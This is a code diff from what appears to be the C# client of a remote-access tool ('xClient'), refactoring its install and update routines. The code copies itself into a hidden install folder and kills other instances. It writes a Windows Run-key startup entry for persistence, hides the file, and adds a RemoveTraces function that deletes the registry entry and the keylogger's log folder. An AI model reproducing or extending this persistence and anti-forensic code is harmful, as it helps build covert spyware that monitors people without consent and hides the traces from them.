@@ -61,7 +61,7 @@ namespace xClient.Core
             "ws.png", "ye.png", "yt.png", "za.png", "zm.png", "zw.png"
         };
 
-        public static bool Disconnect = false;
+        public static bool Disconnect = false; // when Disconnect is true, stop all running threads
         public static string OperatingSystem = string.Empty;
         public static string MyPath = string.Empty;
         public static string InstallPath = string.Empty;
@@ -404,45 +404,8 @@ namespace xClient.Core
             return (idleTime > 600); // idle for 10 minutes
         }
 
-        public static void Install()
+        public static void AddToStartup()
         {
-            bool isKilled = false;
-
-            // create target dir
-            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
-                Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
-
-            // delete existing file
-            if (File.Exists(InstallPath))
-            {
-                try
-                {
-                    File.Delete(InstallPath);
-                }
-                catch (Exception ex)
-                {
-                    if (ex is IOException || ex is UnauthorizedAccessException)
-                    {
-                        // kill old process if new mutex
-                        Process[] foundProcesses =
-                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(InstallPath));
-                        int myPid = Process.GetCurrentProcess().Id;
-                        foreach (var prc in foundProcesses)
-                        {
-                            if (prc.Id == myPid) continue;
-                            prc.Kill();
-                            isKilled = true;
-                        }
-                    }
-                }
-            }
-
-            if (isKilled) Thread.Sleep(5000);
-
-            //copy client to target dir
-            File.Copy(MyPath, InstallPath, true);
-
-            //add to startup
             if (Settings.STARTUP)
             {
                 if (AccountType == "Admin")
@@ -497,6 +460,48 @@ namespace xClient.Core
                     }
                 }
             }
+        }
+
+        public static void Install(bool addToStartup = true)
+        {
+            bool isKilled = false;
+
+            // create target dir
+            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
+                Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
+
+            // delete existing file
+            if (File.Exists(InstallPath))
+            {
+                try
+                {
+                    File.Delete(InstallPath);
+                }
+                catch (Exception ex)
+                {
+                    if (ex is IOException || ex is UnauthorizedAccessException)
+                    {
+                        // kill old process if new mutex
+                        Process[] foundProcesses =
+                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(InstallPath));
+                        int myPid = Process.GetCurrentProcess().Id;
+                        foreach (var prc in foundProcesses)
+                        {
+                            if (prc.Id == myPid) continue;
+                            prc.Kill();
+                            isKilled = true;
+                        }
+                    }
+                }
+            }
+
+            if (isKilled) Thread.Sleep(5000);
+
+            //copy client to target dir
+            File.Copy(MyPath, InstallPath, true);
+
+            if (addToStartup)
+                AddToStartup();
 
             if (Settings.HIDEFILE)
             {
@@ -522,7 +527,7 @@ namespace xClient.Core
             Disconnect = true;
         }
 
-        public static void Update(Client c, string newFile)
+        public static void UpdateClient(Client c, string newFile)
         {
             try
             {
@@ -565,11 +570,83 @@ namespace xClient.Core
 
                 Disconnect = true;
                 c.Disconnect();
+                RemoveTraces();
             }
             catch (Exception ex)
             {
                 DeleteFile(newFile);
                 new Packets.ClientPackets.Status(string.Format("Update failed: {0}", ex.Message)).Execute(c);
+            }
+        }
+
+        public static void RemoveTraces()
+        {
+            if (Settings.STARTUP)
+            {
+                if (AccountType == "Admin")
+                {
+                    try
+                    {
+                        using (
+                            RegistryKey key =
+                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        // try deleting from Registry.CurrentUser
+                        using (
+                            RegistryKey key =
+                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    try
+                    {
+                        using (
+                            RegistryKey key =
+                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                    catch
+                    {
+                    }
+                }
+            }
+
+            string logsDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
+            if (Directory.Exists(logsDirectory)) // try to delete Logs from Keylogger
+            {
+                try
+                {
+                    Directory.Delete(logsDirectory, true);
+                }
+                catch
+                {
+                }
             }
         }
     }
